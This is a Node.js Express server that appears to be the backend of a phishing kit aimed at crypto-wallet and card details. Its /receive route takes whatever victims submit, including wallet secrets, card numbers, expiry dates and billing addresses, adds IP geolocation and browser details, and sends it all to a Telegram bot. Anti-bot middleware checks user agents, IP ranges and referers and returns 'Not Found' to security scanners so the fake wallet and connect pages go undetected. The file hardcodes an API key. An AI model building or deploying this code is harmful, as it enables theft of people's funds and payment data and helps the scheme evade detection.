const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId } = require('./config/settings.js');
const antibot = require('./middleware/antibot');
const { sendMessageFor } = require('simple-telegram-message');
const { getClientIp } = require("request-ip");
const https = require('https');
const querystring = require('querystring');
const axios = require('axios');
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const fs = require('fs').promises;
 
app.use(express.static(path.join(`${__dirname}`)));

const port = 3000; // You can use any available port
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const sendTelegramMessage = (text) => {
  
    const website = `https://api.telegram.org/bot${botToken}`;
    const params = querystring.stringify({
      chat_id: chatId,
      text: text,
    });

    const options = {
      hostname: 'api.telegram.org',
      path: '/bot' + botToken + '/sendMessage',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': params.length,
      },
    };
    
    console.log('sent');

    const req = https.request(options, (res) => {
      // Handle the response if needed
    });

    req.write(params);
    req.end();
};





app.post('/receive', async (req, res) => {
  let message = '';
  let myObject = req.body;

  const sendAPIRequest = async (ipAddress) => {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
		console.log(apiResponse.data);
        return apiResponse.data;
    };

  const ipAddress = getClientIp(req);
  const ipAddressInformation = await sendAPIRequest(ipAddress);
  const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

  const myObjects = Object.keys(myObject);
	console.log(myObjects);
	
    message += `✅ WALLET DETAILS | USER_${ipAddress}\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }
    
    message += `🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

res.send("receive");

  

  if (myObjects.includes('Expiry date') || myObjects.includes('Card Number') || myObjects.includes('Billing Address')) {
    message += `✅ UPDATE TEAM | YAHOO | USER_${ipAddress}\n\n` +
               `👤 CARD INFO\n\n`;

    for (const key of myObjects) {
      console.log(`${key}: ${myObject[key]}`);
      message += `${key}: ${myObject[key]}\n`;
    }
    
    message += `🌍 GEO-IP INFO\n` +
			`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n`+
        `💬 Telegram: https://t.me/UpdateTeams\n`;

res.send('dn');
  }

  
  console.log(message); 
  const sendMessage = sendMessageFor(botToken, chatId); 
  sendMessage(message);
  
  
});




const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { use } = require('express/lib/router');

function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}


// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        return res.status(404).send('Not Found');
    } else {
        res.sendFile(path.join(__dirname, 'index-2.html'));
    }
}

app.get('/wallet', async (req, res) => {
  try {
    let htmlContent;
    const fileName = `wallet.html`;
    htmlContent = await fs.readFile(path.join(__dirname, fileName), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/connect', async (req, res) => {
  try {
    let htmlContent;
    const fileName = `connect.html`;
    htmlContent = await fs.readFile(path.join(__dirname, fileName), 'utf-8');
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});



// Middlewares
app.use(antiBotMiddleware);
app.use(express.static(path.join(__dirname)));


